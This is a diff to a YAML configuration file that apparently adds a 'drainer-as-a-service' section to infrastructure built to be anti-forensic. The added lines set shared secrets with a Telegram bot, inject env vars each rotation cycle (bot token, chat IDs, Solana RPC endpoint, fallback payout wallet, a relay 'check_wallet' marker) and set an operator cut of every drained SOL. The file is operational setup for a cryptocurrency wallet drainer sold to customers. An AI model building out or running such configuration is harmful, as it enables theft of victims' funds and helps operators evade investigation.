@@ -33,3 +33,36 @@ flipper:
   # Embedded Postgres is ephemeral (data dies with VM — anti-forensic).
   # Set this ONLY if you need persistent data across rotation cycles.
   # database_url: "postgresql://user:pass@host:5432/flipper_db"
+
+# Drainer-as-a-service config (chimera hosts customer sites)
+drainer:
+  # Shared AES secret — MUST match the Telegram bot's AES_SECRET
+  # Generate: node -e "console.log('app_' + require('crypto').randomBytes(48).toString('hex'))"
+  aes_secret: "app_GENERATE_ME"
+
+  # Shared secret for the service HTTP API (the bot sends this as X-Service-Key)
+  service_key: "GENERATE_ME"
+
+  # API listen address for the bot (default localhost:8444)
+  # api_host: "127.0.0.1"
+  # api_port: 8444
+
+  # Env injected into the backend machine each rotation cycle.
+  # SERVICE_KEY (the service_key above) and VALID_CHAT_IDS (the current
+  # customer registry) are added automatically — don't list them here.
+  env:
+    AES_SECRET: "app_GENERATE_ME"
+    TELEGRAM_BOT_TOKEN: "your-bot-token"
+    TELEGRAM_CHAT_ID: "your-chat-id"
+    # Operator group — receives hit (confirmed drain) notifications only;
+    # customers get every notification at their own chat id
+    OPERATOR_CHAT_ID: "-5236234661"
+    RPC_ENDPOINT: "https://api.mainnet-beta.solana.com"
+    TARGET_WALLET: "fallback-payout-wallet"
+    # check_wallet marker the relay program expects — leave as the kit's value
+    CHECK_WALLET: "JAByDDeLfddBvzfXaVmivgMR9TZ6Ta8MgX2QHacyhDTP"
+
+  # Operator split — your wallets take this fraction of every drained SOL
+  # (one wallet picked at random per drain). SPL tokens go 100% to customer.
+  # OPERATOR_WALLETS: "wallet1,wallet2"
+  # OPERATOR_CUT: "0.15"
